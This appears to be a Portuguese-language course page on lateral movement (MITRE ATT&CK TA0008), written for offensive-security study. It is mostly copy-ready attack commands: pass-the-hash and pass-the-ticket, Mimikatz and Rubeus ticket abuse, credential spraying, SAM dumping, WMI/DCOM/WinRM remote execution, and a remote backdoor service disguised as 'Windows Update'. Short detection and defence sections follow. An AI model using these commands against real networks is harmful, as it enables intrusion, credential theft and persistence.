# 10 - Movimento Lateral

**MITRE ATT&CK Tactic:** [TA0008 - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)

## 📖 Sobre

Técnicas para **mover-se pela rede** de um sistema comprometido para outros sistemas. Essencial para alcançar objetivos em redes corporativas.

## 🎯 Objetivo

Acessar outros sistemas na rede usando credenciais obtidas ou explorando relações de confiança.

## 📚 Técnicas Principais

### T1021 - Remote Services
- **T1021.001** - Remote Desktop Protocol (RDP)
- **T1021.002** - SMB/Windows Admin Shares
- **T1021.004** - SSH
- **T1021.006** - Windows Remote Management (WinRM)

### T1091 - Replication Through Removable Media
- USB drives
- Autorun malware

### T1080 - Taint Shared Content
- Modificar arquivos em shares
- Trojanizar aplicações compartilhadas

### T1550 - Use Alternate Authentication Material
- **T1550.002** - Pass the Hash
- **T1550.003** - Pass the Ticket
- **T1550.004** - Web Session Cookie

### T1534 - Internal Spearphishing
- Phishing interno
- Contas comprometidas

### T1570 - Lateral Tool Transfer
- Transferir ferramentas entre sistemas
- Staging payloads

## 🛠️ Técnicas de Movimento Lateral

### Pass the Hash (PtH)
```bash
# Impacket - psexec com hash
impacket-psexec -hashes :NTLM_HASH administrator@TARGET_IP

# Impacket - wmiexec
impacket-wmiexec -hashes :NTLM_HASH administrator@TARGET_IP

# Impacket - smbexec
impacket-smbexec -hashes :NTLM_HASH administrator@TARGET_IP

# CrackMapExec
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH -x "whoami"

# Mimikatz
sekurlsa::pth /user:administrator /domain:DOMAIN /ntlm:HASH /run:powershell
```

### Pass the Ticket (PtT)
```powershell
# Mimikatz - Export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt ticket.kirbi

# Rubeus
Rubeus.exe ptt /ticket:ticket.kirbi

# Impacket
export KRB5CCNAME=ticket.ccache
impacket-psexec domain/user@target -k -no-pass
```

### PSExec / SMB
```bash
# Impacket psexec
impacket-psexec domain/user:password@TARGET_IP

# CrackMapExec
crackmapexec smb TARGET_IP -u user -p password -x "whoami"

# Metasploit
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass password
```

### WMI Execution
```powershell
# PowerShell - WMI remote command
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c calc.exe" -ComputerName TARGET

# WMIC
wmic /node:TARGET process call create "cmd.exe /c calc.exe"

# Impacket wmiexec
impacket-wmiexec domain/user:password@TARGET_IP
```

### WinRM / PSRemoting
```powershell
# PowerShell Remoting
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# Executar comando remoto
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami } -Credential $cred

# Evil-WinRM
evil-winrm -i TARGET_IP -u user -p password

# Com hash
evil-winrm -i TARGET_IP -u user -H NTLM_HASH
```

### RDP
```bash
# xfreerdp
xfreerdp /u:administrator /p:password /v:TARGET_IP

# rdesktop
rdesktop -u administrator -p password TARGET_IP

# Pass the Hash com RDP (requer Restricted Admin mode)
xfreerdp /u:administrator /pth:NTLM_HASH /v:TARGET_IP
```

### SSH
```bash
# SSH com senha
ssh user@TARGET_IP

# SSH com chave privada
ssh -i id_rsa user@TARGET_IP

# SSH tunneling
ssh -L local_port:target:target_port user@pivot_host

# SSH ProxyJump
ssh -J pivot_user@pivot_host target_user@target_host
```

### DCOM Execution
```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","")

# ShellBrowserWindow
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","TARGET")
$obj = [Activator]::CreateInstance($com)
$item = $obj.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\Windows\System32",$null,0)
```

### Remote Service Creation
```powershell
# Create service remotely
sc \\TARGET create backdoor binPath= "C:\backdoor.exe"
sc \\TARGET start backdoor

# Impacket services
impacket-services domain/user:password@TARGET create -name backdoor -display "Windows Update" -path "C:\backdoor.exe"
impacket-services domain/user:password@TARGET start -name backdoor
```

## 🎓 Labs Práticos

- [ ] Pass the Hash com CrackMapExec
- [ ] PSExec para sistema remoto
- [ ] WinRM lateral movement
- [ ] Pass the Ticket (Kerberos)
- [ ] RDP com credenciais obtidas
- [ ] WMI remote execution
- [ ] SSH lateral movement
- [ ] DCOM lateral movement

## 🛠️ Ferramentas Essenciais

### Impacket Suite
- **psexec.py** - PSExec implementation
- **wmiexec.py** - WMI execution
- **smbexec.py** - SMB execution
- **atexec.py** - Task scheduler execution
- **dcomexec.py** - DCOM execution

### CrackMapExec
```bash
# Spray credentials
crackmapexec smb targets.txt -u users.txt -p passwords.txt

# Execute commands
crackmapexec smb TARGET -u user -p pass -x "whoami"

# Dump SAM
crackmapexec smb TARGET -u user -p pass --sam
```

### Lateral Movement
- **Evil-WinRM** - WinRM client
- **BloodHound** - AD attack paths
- **Rubeus** - Kerberos abuse
- **Mimikatz** - Credential manipulation
- **Metasploit** - Multiple modules

## 📝 Metodologia de Lateral Movement
```
1. Comprometer sistema inicial (foothold)
2. Enumerar rede interna (descobrir targets)
3. Obter credenciais (dumping, keylogging, etc)
4. Identificar relações de confiança
5. Escolher técnica apropriada (PsExec, WMI, etc)
6. Mover lateralmente
7. Estabelecer persistência no novo host
8. Repetir até atingir objetivo
```

## 🎯 Targets Comuns

### High-Value Targets
```
- Domain Controllers
- Database servers
- File servers
- Backup servers
- Administrador de domínio
- Service accounts privilegiadas
```

### Pivoting Points
```
- Dual-homed hosts (múltiplas redes)
- Jump boxes
- VPN gateways
- Sistemas com confiança estabelecida
```

## 🔍 Detecção

### Indicadores
- Autenticações de contas incomuns
- Conexões SMB/RDP laterais
- Pass-the-Hash indicators
- WMI lateral movement
- PSExec service creation
- Multiple logon failures seguidas de sucesso
- Unusual ticket requests (Kerberos)

### Logs a Monitorar
```
Windows Event IDs:
- 4624: Successful logon
- 4625: Failed logon
- 4648: Explicit credential logon
- 4672: Special privileges assigned
- 4776: NTLM authentication
- 5140: Network share access
- 7045: Service installation
```

### Defesa
- **Least Privilege** - Limitar contas administrativas
- **Network Segmentation** - Dificultar movimento lateral
- **Credential Tiering** - Separar privilégios
- **MFA** - Multi-factor authentication
- **Monitor lateral movement** - SIEM, EDR

## 📚 Recursos

- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [CrackMapExec Wiki](https://wiki.porchetta.industries/)
- [MITRE ATT&CK - Lateral Movement](https://attack.mitre.org/tactics/TA0008/)
- [PayloadsAllTheThings - Lateral Movement](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Lateral%20Movement.md)
- [Bloodhound Documentation](https://bloodhound.readthedocs.io/)

---

**Anterior:** [09-Descoberta](../09-Descoberta/) | **Próximo:** [11-Coleta](../11-Coleta/)